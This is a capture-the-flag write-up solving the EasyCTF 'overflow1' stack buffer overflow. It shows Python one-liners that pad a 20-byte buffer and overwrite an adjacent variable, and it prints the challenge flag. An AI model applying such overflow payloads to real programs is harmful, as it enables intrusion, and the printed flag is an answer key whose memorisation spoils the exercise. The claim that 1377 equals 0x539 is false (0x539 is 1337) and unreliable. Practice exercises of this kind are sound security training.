Description:
```
Can you overflow the stack? Try it at /problems/overflow1 on the EasyCTF shell server. The source is available at /problems/overflow1/overflow1.c, and the program you're trying to overflow is at /problems/overflow1/overflow1. Good luck!
```
Hint:
```
Read a little bit about the stack [here](https://www.exploit-db.com/docs/28475.pdf).
```
In the source file we can see that the buffer is 20 bytes long. After some trial and error we can see that if we overflow it by 8 bytes then the next ones are going to overwrite the ```x``` variable.
```
user6ad18@shell:/problems/overflow1$ python -c 'print "A"*29' | ./overflow1
65
```
"A" is just an arbitrary character used to fill the buffer. And 65 is its ASCII value. 1377 is equal to 539 in hexadecimal. We cannot insert is as one character though so it needs to be split. Because the value is stored in little-endian we also have to order it in right way.
Now we can run the modified version of our command:
```
user6ad18@shell:/problems/overflow1$ python -c 'print "A"*28 + chr(0x39) + chr(0x5)' | ./overflow1
Here's a flag: easyctf{i_wish_everything_were_th1s_34sy}
```
